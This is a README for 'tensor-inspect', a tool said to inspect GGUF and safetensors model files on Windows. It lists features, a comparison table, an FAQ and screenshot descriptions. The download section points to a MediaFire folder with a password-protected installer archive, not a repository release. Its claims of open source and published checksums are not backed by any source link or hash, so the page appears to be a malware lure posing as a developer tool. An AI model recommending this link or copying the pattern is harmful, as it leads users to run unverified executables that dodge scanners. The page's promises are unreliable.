# tensor-inspect

🔬 Free, open-source tensor inspector for Windows — browse shapes, dtypes and quants in GGUF and safetensors, diff two models. 100 MB MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Tensor table** — every tensor with name, shape, dtype and quant type in a fast sortable grid
- ✅ **Search and filter** — jump to layer 17 attention or all MoE experts in one query
- ✅ **Model diff** — compare two checkpoints and list added, removed and resized tensors
- ✅ **Layer summary** — architecture at a glance: layer count, hidden size, head config, vocab
- ✅ **Quant report** — which tensors are Q4_K, which stayed F16, and total bytes per type
- ✅ **CSV export** — full tensor manifest for spreadsheets and scripts
- ✅ **100 MB self-contained exe** — no runtime install, portable, offline, MIT with SHA-256 releases

## Why tensor-inspect

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **tensor-inspect** | Netron | safetensors CLI | HF tooling |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free, OSS | Free, OSS |
| Open source | **Yes** | Yes | Yes | Yes |
| GGUF quant type reporting | **Yes** | Partial | No | Partial
| Two-model diff | **Yes** | No | No | No |
| Sortable tensor grid | **Yes** | Graph only | No | No |
| Portable, no install | **Yes, 100 MB** | App | Python env | Python env

## FAQ

**how to inspect tensors inside a GGUF or safetensors file?**

Reading tensor layouts usually means Python one-liners that print walls of text, while graph viewers skip GGUF quant details entirely. tensor-inspect lists every tensor with shape, dtype and quant type, summarizes the architecture and diffs two models. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark grid (#121417, lime #A3E635): tensor table with name, shape, dtype and bytes columns, filter field showing attn, detail pane right with layer 17 rows.
2. Quant report: stacked bar of F16, Q4_K_M and Q6_K byte totals, legend beside it, chip reading 92 percent of weights quantized.
3. Diff view: two file names at top, added and removed tensor lists with colored markers, summary bar reading 4 resized, 2 missing.

## Download

| Source | Link |
|---|---|
| 💾 **Installer tensor-inspect** | [Installer tensor-inspect](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).